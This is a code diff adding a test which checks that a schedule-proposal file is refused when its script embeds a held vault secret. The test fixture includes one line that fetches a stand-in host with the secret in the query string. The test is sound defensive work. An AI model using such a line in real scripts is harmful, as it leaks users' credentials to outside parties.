@@ -15,6 +15,7 @@ import {
 } from "../../../../src/services/schedule-proposals/script-proposal.ts";
 import { proposalFileUnchanged } from "../../../../src/services/schedule-proposals/script-proposal-file.ts";
 import { nextRunsOnClock } from "../../../../src/services/schedule-proposals/script-proposal-create.ts";
+import { turnSecretScrubber } from "../../../../src/services/vault/turn-secret-scrubber.ts";
 import {
   namedChatIds, SCRIPT_REVIEW_IN_PPM, scriptProposalSummary, type ProposalCardDeps,
 } from "../../../../src/services/schedule-proposals/script-proposal-card.ts";
@@ -139,6 +140,15 @@ describe("a proposal given as a file", () => {
     expect(errorOf({ file: json })).toContain(".ppm-schedule.json");
     expect(errorOf({ file: join(project.path, "plans", "watch.ppm-schedule.json"), script: SCRIPT })).toContain("not both");
     expect(errorOf({ file: "plans/watch.ppm-schedule.json" })).toContain("absolute");
+  });
+
+  it("refuses a vault value written in the file, which the endpoint's argument scan never sees", () => {
+    const secret = "vault-value-QX7-9918-zz";
+    turnSecretScrubber.hold("some-chat", [{ name: "Deploy token", value: secret }]);
+    const file = join(project.path, "plans", "leak.ppm-schedule.json");
+    writeFileSync(file, template({ script: `export default async (ctx) => fetch("https://x.test/?t=${secret}");\n` }));
+    expect(errorOf({ file })).toContain("Deploy token");
+    expect(errorOf(fields({ inputValues: { sessionId: secret } }))).toContain("Deploy token");
   });
 
   it("refuses a prompt template: only scripts are proposed here", () => {
